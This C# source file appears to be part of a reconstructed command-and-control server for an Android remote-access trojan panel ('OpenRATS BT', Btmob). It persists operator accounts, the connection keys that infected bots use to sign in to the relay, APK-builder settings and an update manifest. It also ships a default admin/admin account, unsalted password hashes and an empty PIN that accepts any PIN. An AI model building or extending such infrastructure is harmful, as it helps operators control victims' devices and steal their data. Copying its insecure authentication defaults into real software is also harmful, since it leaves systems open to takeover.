// ServerConfig.cs — persisted configuration for the OpenRATS BT server.
//
// The vendor's original server was a PHP site under /yaarsa/ with accounts,
// per-account connection keys ("conkey"), and a store of built APKs. This
// reconstruction keeps the same observable concepts but stores them in a
// single JSON file next to the server binary (serverconfig.json).

using System.Collections.Generic;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace BtServer;

public class ServerConfig
{
    // ---- persistence ----
    public static readonly string ConfigPath =
        Path.Combine(AppContext.BaseDirectory, "serverconfig.json");

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        WriteIndented = true,
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
    };

    // ---- operator accounts ----
    public List<AccountRecord> Accounts { get; set; } = new();

    // ---- connection keys ("conkey") accepted from bots ----
    // key => note. The ApkMaker's "connection key" field must be one of these
    // (bots sign in to the relay with {cokey}); the panel also shows it.
    public Dictionary<string, string> ConnectionKeys { get; set; } = new();

    // ---- the address the panel connects to is simply this host; the panel
    // also needs the WebSocket port for the relay (default from BTConst.socketapi). ----
    public int HttpPort { get; set; } = 80;
    public int WebSocketPort { get; set; } = 8080;

    // ---- update manifest the panel's CheckUpdate flow expects ----
    public UpdateRecord Update { get; set; } = new();

    public static ServerConfig Load()
    {
        if (File.Exists(ConfigPath))
        {
            try
            {
                return JsonSerializer.Deserialize<ServerConfig>(File.ReadAllText(ConfigPath), JsonOpts) ?? new ServerConfig();
            }
            catch
            {
                // fall through to defaults on a corrupt file
            }
        }
        ServerConfig cfg = new ServerConfig();
        cfg.EnsureDefaults();
        return cfg;
    }

    public void Save()
    {
        File.WriteAllText(ConfigPath, JsonSerializer.Serialize(this, JsonOpts));
    }

    public void EnsureDefaults()
    {
        if (Accounts.Count == 0)
            Accounts.Add(new AccountRecord
            {
                Email = "admin@btserver.local",
                // SHA-256 hex (no salt — matches the era and keeps PHP parity simple)
                PasswordSha256 = Sha256Hex("admin"),
                PinKey = "",
                Subscription = "lifetime",
                Expires = "2099-12-31",
                ShareLink = Guid.NewGuid().ToString("N").Substring(0, 16),
            });
        if (ConnectionKeys.Count == 0)
            ConnectionKeys["openrats"] = "default OpenRATS connection key";
        Save();
    }

    public AccountRecord FindAccount(string email)
        => Accounts.FirstOrDefault(a => string.Equals(a.Email, email, StringComparison.OrdinalIgnoreCase));

    public bool VerifyPassword(AccountRecord acc, string password)
        => acc != null && FixedTimeEquals(acc.PasswordSha256, Sha256Hex(password ?? ""));

    // ---- helpers ----
    public static string Sha256Hex(string s)
    {
        using var sha = System.Security.Cryptography.SHA256.Create();
        byte[] h = sha.ComputeHash(System.Text.Encoding.UTF8.GetBytes(s ?? ""));
        return Convert.ToHexString(h).ToLowerInvariant();
    }

    private static bool FixedTimeEquals(string a, string b)
    {
        if (a == null || b == null || a.Length != b.Length) return false;
        int diff = 0;
        for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
        return diff == 0;
    }
}

public class AccountRecord
{
    public string Email { get; set; }
    public string PasswordSha256 { get; set; }
    // "XXXX-XXXX-XXXX-XXXX" server PIN shown on the login page (optional;
    // when the panel has a saved pin it skips the web login page and calls
    // btlogin.php directly — an empty pin means any pin is accepted by
    // this server, mirroring the panel's "no passcodes detected" note).
    public string PinKey { get; set; }
    public string Uid { get; set; } = Guid.NewGuid().ToString("N");
    public string Subscription { get; set; } = "lifetime";
    public string Expires { get; set; } = "2099-12-31";
    public string ShareLink { get; set; }
    public string HardwareId { get; set; }
    // rotating per-session key the panel stores via ServersMgr.SaveServerNextKey
    public string NextKey { get; set; } = NewNextKey();

    public static string NewNextKey()
    {
        // 32 chars from the same alphabet codes.StrGenerator uses
        const string chars = "qazwsxedcrfvtgbyhnujmiklopQAZWSXEDCRFVTGBYHNUJMIKOLP";
        var rng = System.Security.Cryptography.RandomNumberGenerator.Create();
        byte[] buf = new byte[32];
        rng.GetBytes(buf);
        var sb = new System.Text.StringBuilder(32);
        for (int i = 0; i < 32; i++) sb.Append(chars[buf[i] % chars.Length]);
        return sb.ToString();
    }
}

public class UpdateRecord
{
    public string Version { get; set; } = "4.6.1";
    public string Hash { get; set; } = "";      // MD5 of current Btmob.exe — panel compares before updating
    public string Date { get; set; } = "22 June 2026";
    public string Size { get; set; } = "0";
}
